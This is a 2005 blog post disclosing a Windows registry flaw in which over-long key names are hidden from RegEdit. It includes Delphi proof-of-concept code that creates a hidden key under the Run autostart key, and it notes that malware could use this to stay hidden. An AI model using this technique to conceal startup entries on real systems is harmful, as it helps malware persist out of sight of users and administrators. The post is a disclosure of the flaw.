---
comments: true
date: 2005-10-12 01:41:54
layout: post
slug: a-serious-flaw-in-the-windows-registry
title: A serious flaw in the Windows registry
authors: [admin]
wordpress_id: 154
---

Sometimes you run into problems bigger than you imagine.

While looking into a flaw reported at [Secunia in August](http://secunia.com/advisories/16560/), I never suspected the problem was more serious than I thought.

Essentially, the flaw lets you write an entry (key) in the registry that is not visible to tools like Microsoft RegEdit.

As the image shows, I was able to create a hidden entry in the registry:


It turns out that under Optional there is a key whose name consists of 256 X's in a row.

The following Delphi code explains the flaw:
    
```
    procedure TestRegistryFlaw;
    var
        I: Integer;
        reg : TRegistry;
        key : string;
    begin
        reg := TRegistry.Create;
        key := 'SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Optional\';
        try
            for I := 0 to 255 do    // Iterate
                key := key + 'X';
            reg.RootKey := HKEY_LOCAL_MACHINE;
            if reg.OpenKey(key, true) then
            begin
                ShowMessage('trying to hack');
                reg.WriteString('TestFlaw', 'This is hacked registry key');
                ShowMessage('hacked!!!');
            end;
        finally
            reg.Free;
        end;
    end;

    procedure CheckRegistryFlaw;
    var
        I: Integer;
        reg : TRegistry;
        key : string;
    begin
        reg := TRegistry.Create;
        key := 'SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Optional\';
        try
            reg.RootKey := HKEY_LOCAL_MACHINE;
            for I := 0 to 255 do    // Iterate
                key := key + 'X';
            if reg.OpenKey(key, false) then
            ShowMessage(reg.ReadString('TestFlaw'));
        finally
            reg.Free;
        end;
    end;
```

What we have here is that we've created an entry that is not visible to regedit and other Windows utilities.

But the worst part is that in Microsoft.Net this code can't be written, because the RegistryKey class performs a check, raising an exception if you try to write a key longer than 255.

In short, what they do in Microsoft.Net is sweep the bug under the rug.

But what's the problem with this? It's that you can write code into the Windows Run key, which makes it [possible to hide viruses or malware of any kind](http://techrepublic.com.com/2100-1009_11-5843863.html), to be executed as soon as Windows starts, and you won't be able to see it, because the Windows tools give you no way to inspect this malicious code.

It is possible to write code in C# or C++ that does the same thing as the Delphi code I wrote above. I suggest looking at my post on DarkSideProgramming: [Hidding a Flaw](http://www.darksideprogramming.org/archives/2005/10/hidding_a_flaw.html).

But the interesting thing is that some programmers at CodeProject have discovered that, at least on Windows XP with SP2, the flaw is more serious!



